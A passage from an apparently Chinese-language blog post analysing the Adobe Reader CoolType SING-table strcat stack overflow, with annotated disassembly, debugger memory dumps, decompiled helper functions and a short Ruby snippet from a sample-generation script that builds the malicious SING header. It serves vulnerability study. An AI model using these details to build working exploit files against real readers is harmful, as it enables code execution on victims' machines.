class="line"><span class="symbol">.text:</span>0803DD7A     <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; ecx为字体对象,thiscall,ecx传参</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7D     <span class="keyword">call</span>    sub_8021B06             <span class="comment">; 解析字体对象,处理SING表</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD82     <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; eax指向SING表数据</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85     <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                <span class="comment">; 判断是否为空</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85 <span class="comment">;&#125; // starts at 803DD53</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87     <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8B     <span class="keyword">jz</span>      short loc_803DDC4       <span class="comment">; 这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8D     <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]              <span class="comment">; 字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到strcat</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8F     <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD95     <span class="keyword">jz</span>      short loc_803DD9F       <span class="comment">; 这里跳转，jz和je机器码是一样的，IDA识别为jz，OllyDbg识别为je，这里jz感觉好理解一点</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD97     <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9D     <span class="keyword">jnz</span>     short loc_803DDC0</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F loc_803DD9F:                <span class="comment">; CODE XREF: sub_803DCF9+9C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9F     <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                       <span class="comment">; 相对SING表入口偏移0x10处找到uniqueName</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA2     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA3     <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf] <span class="comment">; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA6     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat目的地址入栈</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA7     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf], <span class="number">0</span>   <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDAB     <span class="keyword">call</span>    strcat                         <span class="comment">; 调用strcat函数，造成溢出</span></span><br></pre></td></tr></table></figure>
<h4 id="2、动态调试"><a href="#2、动态调试" class="headerlink" title="2、动态调试"></a>2、动态调试</h4><h5 id="2-1、sub-8021B06-函数的作用"><a href="#2-1、sub-8021B06-函数的作用" class="headerlink" title="2.1、sub_8021B06()函数的作用"></a>2.1、sub_8021B06()函数的作用</h5><blockquote>
<ul>
<li>1、打开Adobe Reader,再打开OllyDbg,<code>attach</code>上Adobe Reader进程。</li>
<li>2、在<code>0x0803DD74</code>下断点,运行程序。</li>
<li>3、观察传入的<code>参数值</code>，及其<code>内存状态</code>。</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1、函数执行前</span><br><span class="line">    0803DD74    68 4CDB1908     push CoolType.0819DB4C                   ; ASCII 53,&quot;ING&quot;</span><br><span class="line">    0803DD79    57              push edi</span><br><span class="line">    0803DD7A    8D4D DC         lea ecx,dword ptr ss:[ebp-0x24]</span><br><span class="line">--&gt; 0803DD7D    E8 843DFEFF     call CoolType.08021B06</span><br><span class="line"></span><br><span class="line">ecx = ebp-0x24=0x0012E4D8-0x24=0x0012E4B4</span><br><span class="line">栈上的参数:</span><br><span class="line">esp --&gt; 0012E468   0012E718</span><br><span class="line">        0012E46C   0819DB4C  ASCII 53,&quot;ING&quot;</span><br><span class="line"></span><br><span class="line">[ecx]=[0x0012E4B4]=0x04952118</span><br><span class="line">04952118  00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  .......OS/2</span><br><span class="line">04952128  B4 5F F4 63 00 00 EB 70 00 00 00 56 50 43 4C 54  確鬰..雙...VPCLT</span><br><span class="line">04952138  D1 8A 5E 97 00 00 EB C8 00 00 00 36 63 6D 61 70  褗^?.肴...6cmap</span><br><span class="line">04952148  A4 C3 E8 A0 00 00 B1 6C 00 00 03 58 63 76 74 20  っ锠..眑..Xcvt</span><br><span class="line">04952158  FF D3 1D 39 00 00 1E FC 00 00 01 FC 66 70 67 6D  ?9..?.黤pgm</span><br><span class="line">04952168  E7 B4 F1 C4 00 00 26 60 00 00 00 8B 67 61 73 70  绱衲..&amp;`...媑asp</span><br><span class="line">04952178  00 07 00 07 00 01 01 48 00 00 00 0C 67 6C 79 66  ...H....glyf</span><br><span class="line">04952188  0C 74 41 CF 00 00 26 EC 00 00 8A 7E 68 64 6D 78  .tA?.&amp;?.妦hdmx</span><br><span class="line">04952198  34 F0 21 0E 00 00 EC 00 00 00 15 48 68 65 61 64  4?..?..Hhead</span><br><span class="line">049521A8  DD 84 A2 D0 00 01 01 54 00 00 00 36 68 68 65 61  輨⑿.T...6hhea</span><br><span class="line"></span><br><span class="line">2、函数执行后</span><br><span class="line">    0803DD7A    8D4D DC         lea ecx,dword ptr ss:[ebp-0x24]</span><br><span class="line">    0803DD7D    E8 843DFEFF     call CoolType.08021B06</span><br><span class="line">    0803DD82    8B45 DC         mov eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">--&gt; 0803DD85    3BC6            cmp eax,esi</span><br><span class="line"></span><br><span class="line">eax=[ebp-0x24]=[0x0012E4D8-0x24]=[0x0012E4B4]=0x0495231C</span><br><span class="line"></span><br><span class="line">eax</span><br><span class="line">0495231C  00 00 01 00 01 0E 00 01 00 00 00 00 00 00 00 3A  ...........:</span><br><span class="line">0495232C  F1 B9 F1 F4 75 62 82 1D 14 A7 82 4A 0C 0C 0C 0C  窆耵ub?J....</span><br><span class="line">0495233C  AC 86 F7 B5 ED 50 17 29 5C 12 8D 01 4E 51 05 0E  瑔鞯鞵)\?NQ</span><br><span class="line">0495234C  E7 CC BC CA 6B 02 ED 81 13 36 AD 5E 45 85 DC 7D  缣际k韥6璣E呠&#125;</span><br><span class="line">0495235C  DB C2 4B 84 E8 67 8A 92 74 90 C8 3D 03 65 FE 80  勐K勮g姃t惾=e</span><br><span class="line">0495236C  4E E7 C7 42 89 8B DA 08 91 71 7A 3D 83 8E BD 60  N缜B墜?憅z=儙絗</span><br><span class="line">0495237C  AB 8F FA 53 8E F2 15 70 D8 66 BB A0 24 09 05 CD  珡鶶庲p豧粻$.</span><br><span class="line">0495238C  E6 10 AE B9 B2 E0 B8 40 91 36 FC 66 8B 7B BE C2  ?侧窣?黤媨韭</span><br><span class="line">0495239C  65 24 37 DA 2B 2C FC FA 04 89 92 95 B5 3A 22 FE  e$7?,墥暤:&quot;</span><br><span class="line">049523AC  44 BA 47 90 BD 17 78 9A 86 A8 CC 2A B1 0B FA 8F  D篏惤x殕ㄌ*?鷱</span><br><span class="line">049523BC  54 C7 4B 6D BF 1A 47 1D 33 0D 72 DC D3 8E 1E FC  T荎m?G3.r苡?</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们可以看到<code>sub_8021B06()</code>函数有<strong><code>三个参数</code></strong>,<strong><code>第一个参数</code></strong>是this指针,其值为PDF中<code>对象10</code>在内存中的首地址,也就是<code>字体对象</code>的指针。<strong><code>第二个参数</code></strong>edi是sub_80DD0B3()函数ebp处的一个<code>类对象的指针</code>,其<code>第一个成员变量</code>的值为dword_823A850被加1前的值(dword_823A850在sub_8024217函数中被加1),也就是0。<strong><code>第三个参数</code></strong>是“SING”字符串,sub_8021B06()函数通过在<code>字体对象</code>中匹配“SING”字符串,来获得<code>“SING”表目录项</code>,从而获得<code>“SING”表数据</code>的地址。所以,我们可以推测sub_8021B06()函数的功能为求出“SING”表数据在内存中的地址。</p>
<p>&emsp;&emsp;我们再来看一下参数<code>edi中的值</code>是什么,虽然其值可能不会影响我们的判断,但是为了从中学到更多的东西,还是来看一下吧。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、sub_8021B06()参数回溯,edi就是调用sub_8021B06()函数时传入的a1.</span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80DD0B3</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _DWORD *a5, <span class="keyword">int</span> a6)</span></span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="comment">//value1_823A850变量的地址为ebp=0x0012E718</span></span><br><span class="line">sub_80151B5(&amp;value1_823A850);                 <span class="comment">// 清零0x0012E718后面的一些数据,0x0012E718应该为某个对象的首地址,此函数像是类的构造函数</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="comment">// 返回dword_823A850加1之前的值</span></span><br><span class="line">value_823A850 = sub_8024217(&amp;stru_823A838, <span class="number">0</span>);<span class="comment">// this传参,_RTL_CRITICAL_SECTION结构体对象</span></span><br><span class="line">value1_823A850 = value_823A850;</span><br><span class="line">    ↑    ↑    ↑</span><br><span class="line">    |    |    |</span><br><span class="line">v23 = sub_803DCF9((<span class="keyword">int</span>)&amp;value1_823A850, &amp;v9, <span class="number">0</span>, (<span class="keyword">int</span>)&amp;v22) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> __<span class="function">cdecl <span class="title">sub_803DCF9</span><span class="params">(<span class="keyword">int</span> a1, _DWORD *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line">    ↑    ↑    ↑</span><br><span class="line">    |    |    |</span><br><span class="line">sub_8021B06(&amp;v18, a1, <span class="string">"SING"</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、sub_80151B5()函数的内容.</span><br><span class="line">_DWORD *__<span class="function">thiscall <span class="title">sub_80151B5</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx v2=0/edx:xor edx,edx</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="keyword">this</span>;</span><br><span class="line">  *<span class="keyword">this</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_801512D(<span class="keyword">this</span> + <span class="number">5</span>);                        <span class="comment">// 对象(0x0012E72C)的构造函数</span></span><br><span class="line">  v1[<span class="number">15</span>] = v2;</span><br><span class="line">  v1[<span class="number">16</span>] = v2;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">68</span>) = v2;                     <span class="comment">// v[17]的第一个字节设为0</span></span><br><span class="line">  v1[<span class="number">18</span>] = v2;</span><br><span class="line">  v1[<span class="number">19</span>] = v2;</span><br><span class="line">  v1[<span class="number">20</span>] = v2;</span><br><span class="line">  v1[<span class="number">21</span>] = v2;</span><br><span class="line">  v1[<span class="number">22</span>] = v2;</span><br><span class="line">  v1[<span class="number">23</span>] = v2;</span><br><span class="line">  v1[<span class="number">49</span>] = <span class="number">-1</span>;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">188</span>) = v2;                    <span class="comment">// v1[47]的第一个字节设为0</span></span><br><span class="line">  v1[<span class="number">48</span>] = v2;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">200</span>) = v2;                    <span class="comment">// v1[50]的第一个字节设为0</span></span><br><span class="line">  <span class="built_in">memset</span>(v1 + <span class="number">24</span>, v2, <span class="number">92u</span>);                     <span class="comment">// 从第24dword开始,后23个dword设为0</span></span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">对象(0x0012E718)的内存布局(初始):</span></span><br><span class="line"><span class="comment">0x0012E718 *this = 0   -|</span></span><br><span class="line"><span class="comment">0x0012E71C this[1] = 0  |</span></span><br><span class="line"><span class="comment">0x0012E720 this[2] = 0  | &#123;sub_80151B5&#125;</span></span><br><span class="line"><span class="comment">0x0012E724 this[3] = 0  |</span></span><br><span class="line"><span class="comment">0x0012E728 this[4] = 0 -|</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0x0012E72C *this = 0 -------------------| 0x0012E72C-0x0012E750,应该也是一个对象</span></span><br><span class="line"><span class="comment">0x0012E730 0x049517D8                   | [0x049517D8]=0x08190108,const BIB_T_MT::BIBVTabGeneric::`vftable'</span></span><br><span class="line"><span class="comment">0x0012E734 this[2] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E738 this[3] = 0 -----------------| &#123;sub_801512D&#125;</span></span><br><span class="line"><span class="comment">0x0012E73C                              | 0012E73C   01E79BA0  ASCII "BIBDataStoreGetBlockProcV2"</span></span><br><span class="line"><span class="comment">0x0012E740 this[5] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E744 this[6] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E748 this[7] = 0 -----------------|</span></span><br><span class="line"><span class="comment">0x0012E74C this[8] = sub_80833EF -------|</span></span><br><span class="line"><span class="comment">0x0012E750 result[9] = result = this ---| 0x0012E72C</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0x0012E754 v1[15] = v2 = 0 ----------------| </span></span><br><span class="line"><span class="comment">0x0012E758 v1[16] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E75C *((_BYTE *)v1 + 68) = v2 = 0; --| 0012E75C   0804AA00  返回到 CoolType.0804AA00</span></span><br><span class="line"><span class="comment">0x0012E760 v1[18] = v2 = 0 ----------------| </span></span><br><span class="line"><span class="comment">0x0012E764 v1[19] = v2 = 0 ----------------| &#123;sub_80151B5&#125;</span></span><br><span class="line"><span class="comment">0x0012E768 v1[20] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E76C v1[21] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E770 v1[22] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E774 v1[23] = v2 = 0 ----------------|</span></span><br><span class="line"><span class="comment">0x0012E778 - 0x0012E7D4 v1[24]~v1[46] = v2 = 0 --| memset(v1 + 24, v2, 92u);</span></span><br><span class="line"><span class="comment">0x0012E7D4 *((_BYTE *)v1 + 188) = v2 = 0 --------| 0012E7D4   02A93200   </span></span><br><span class="line"><span class="comment">0x0012E7D8 v1[48] = v2 = 0 ----------------------| &#123;sub_80151B5&#125;                     </span></span><br><span class="line"><span class="comment">0x0012E7DC                                       | 0012E7DC   FFFFFFFF</span></span><br><span class="line"><span class="comment">0x0012E7E0 *((_BYTE *)v1 + 200) = v2 = 0 --------| 0012E7E0   02A93200</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、sub_8024217()函数的内容.</span><br><span class="line">value_823A850 = sub_8024217(&amp;stru_823A838, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">.data:<span class="number">0823</span>A838 stru_823A838    _RTL_CRITICAL_SECTION &lt;?&gt;</span><br><span class="line">.data:<span class="number">0823</span>A838                                         ; DATA XREF: sub_80252EC+<span class="number">104</span>↑o</span><br><span class="line">.data:<span class="number">0823</span>A838                                         ; sub_809C3A4+<span class="number">1B</span>9↑o ...</span><br><span class="line">.data:<span class="number">0823</span>A850 dword_823A850   dd ?                    ; DATA XREF: sub_818DB2A+B↑w</span><br><span class="line">.data:<span class="number">0823</span>A854                 align <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RTL_CRITICAL_SECTION</span> &#123;</span></span><br><span class="line">    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;</span><br><span class="line">    LONG LockCount;</span><br><span class="line">    LONG RecursionCount;</span><br><span class="line">    HANDLE OwningThread;</span><br><span class="line">    HANDLE LockSemaphore;</span><br><span class="line">    ULONG_PTR SpinCount;</span><br><span class="line">&#125;;大小为<span class="number">4</span>*<span class="number">6</span> = <span class="number">24</span> = <span class="number">0x18</span>h字节</span><br><span class="line"></span><br><span class="line">_RTL_CRITICAL_SECTION_DEBUG *__thiscall sub_8024217(LPCRITICAL_SECTION lpCriticalSection, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> lpCriticalSection1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line"></span><br><span class="line">  lpCriticalSection1 = (<span class="keyword">int</span>)lpCriticalSection;</span><br><span class="line">  EnterCriticalSection(lpCriticalSection);      <span class="comment">// 进入临界区</span></span><br><span class="line">  v3 = *(_DWORD *)(lpCriticalSection1 + <span class="number">24</span>);    <span class="comment">// v3为全局变量dword_823A850的值,其初始值为0.</span></span><br><span class="line">  *(_DWORD *)(lpCriticalSection1 + <span class="number">24</span>) = v3 + <span class="number">1</span>;<span class="comment">// dword_823A850=dword_823A850+1=1</span></span><br><span class="line">  LeaveCriticalSection((LPCRITICAL_SECTION)lpCriticalSection1);</span><br><span class="line">  <span class="keyword">return</span> v3;     <span class="comment">// 返回加1之前的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<strong><code>thiscall</code></strong>是<code>C++</code>中特有的<code>调用约定</code>,用于<code>成员函数</code>的调用。根据上面给出的<code>sub_80151B5()函数</code>的伪代码,可以看出此函数返回了<code>this指针</code>,并且<code>此函数</code>也是sub_80DD0B3()函数中定义的<code>对象(0x0012E718)</code>在作用域内调用的<code>第一个成员函数</code>,<code>sub_80151B5()函数</code>中使用<code>this指针</code>对其成员变量<code>赋初值</code>。这些都是一个<strong><code>构造函数</code></strong>拥有的特征。<br>&emsp;&emsp;通过上面的分析,我们可以知道<code>sub_8021B06()</code>的<code>第二个参数</code>a1为<code>对象(0x0012E718)的指针</code>,其第一个成员变量的值为0。</p>
<h5 id="2-2、strcat-函数溢出分析"><a href="#2-2、strcat-函数溢出分析" class="headerlink" title="2.2、strcat()函数溢出分析"></a>2.2、strcat()函数溢出分析</h5><p>&emsp;&emsp;通过上面的静态分析,我们可以知道程序执行完<code>sub_8021B06()函数</code>后,得到了<code>SING表数据</code>的地址。首先程序对SING表数据的<strong><code>“tableVersionMajor”</code></strong>字段和<strong><code>“tableVersionMinor”</code></strong>字段进行了判断,满足条件后,才会执行<code>strcat()</code>函数,将构造的<code>“uniqueName”</code>字段内容复制到<code>栈</code>上。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0803DD82      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; eax指向SING表数据,eax=[ebp-0x24]=[0x0012E4B4]=0x04960104</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                <span class="comment">; 判断是否为空,esi为0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85</span><br><span class="line"><span class="symbol">.text:</span>0803DD87      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8B      <span class="keyword">jz</span>      short loc_803DDC4 <span class="comment">; 这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8D      <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]        <span class="comment">; 字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到strcat</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8F      <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD95      <span class="keyword">jz</span>      short loc_803DD9F <span class="comment">; 这里跳转，jz和je机器码是一样的，IDA识别为jz，OllyDbg识别为je，这里jz感觉好理解一点</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD97      <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9D      <span class="keyword">jnz</span>     short loc_803DDC0</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这里有<strong><code>两种情况</code></strong>都满足要求,<strong><code>第一种</code></strong>,以小端序读出的版本号形如：<code>0x????0000</code>。也就是SING表的<code>“tableVersionMajor”</code>字段为0,<code>“tableVersionMinor”</code>字段没有要求,版本号为<code>0.x</code>。<strong><code>第二种</code></strong>,以小端序读出的版本号形如：<code>0x????0100</code>。也就是SING表的<code>“tableVersionMajor”</code>字段为1,<code>“tableVersionMinor”</code>字段没有要求,版本号为<code>1.x</code>。样本中使用的是<code>第一种</code>。</p>
<p><strong><code>样本生成脚本</code></strong>中关于这部分的构造如下：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sing = <span class="string">''</span></span><br><span class="line">sing &lt;&lt; [</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>,   <span class="comment"># tableVersionMajor, tableVersionMinor (0.1)</span></span><br><span class="line">    <span class="number">0xe01</span>,  <span class="comment"># glyphletVersion</span></span><br><span class="line">    <span class="number">0x100</span>,  <span class="comment"># embeddingInfo</span></span><br><span class="line">    <span class="number">0</span>,      <span class="comment"># mainGID</span></span><br><span class="line">    <span class="number">0</span>,      <span class="comment"># unitsPerEm</span></span><br><span class="line">    <span class="number">0</span>,      <span class="comment"># vertAdvance</span></span><br><span class="line">    <span class="number">0x3a00</span>  <span class="comment"># vertOrigin</span></span><br><span class="line">].pack(<span class="string">'vvvvvvvv'</span>) <span class="comment"># 把两个字符当作 little-endian 字节顺序的无符号的 short。</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;接下来,我们分析<code>“uniqueName”字段</code>复制到<code>栈上的位置</code>,以及<code>长度</code>。</p>
<blockquote>
<ul>
<li>1、打开Adobe Reader,再打开OllyDbg,<code>attach</code>上Adobe Reader进程。</li>
<li>2、在<code>0x0803DD9F</code>下断点,运行程序。</li>
<li>3、观察传入的<code>参数值</code>，及其<code>内存状态</code>。</li>
</ul>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eax</span> = <span class="number">0x04960104</span>(SING表数据入口地址)</span><br><span class="line">0803DD9F    83C0 <span class="number">10</span>         <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0x10</span>                    <span class="comment">; eax = eax+0x10 = 0x04960104+0x10 = 0x04960114(“uniqueName”字段起始地址)</span></span><br><span class="line">0803DDA2    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span>                        <span class="comment">; strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line">0803DDA3    8D45 <span class="number">00</span>         <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>]      <span class="comment">; eax = ebp = 0x0012E4D8</span></span><br><span class="line">0803DDA6    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span>                        <span class="comment">; strcat目的地址入栈</span></span><br><span class="line">0803DDA7    C645 <span class="number">00</span> <span class="number">00</span>      <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>],<span class="number">0x0</span>       <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line">0803DDAB    E8 483D1300     <span class="keyword">call</span> &lt;<span class="keyword">jmp</span>.&amp;MSVCR80.strcat&gt;      <span class="comment">; 调用strcat函数，造成溢出</span></span><br></pre></td></tr></table></figure>
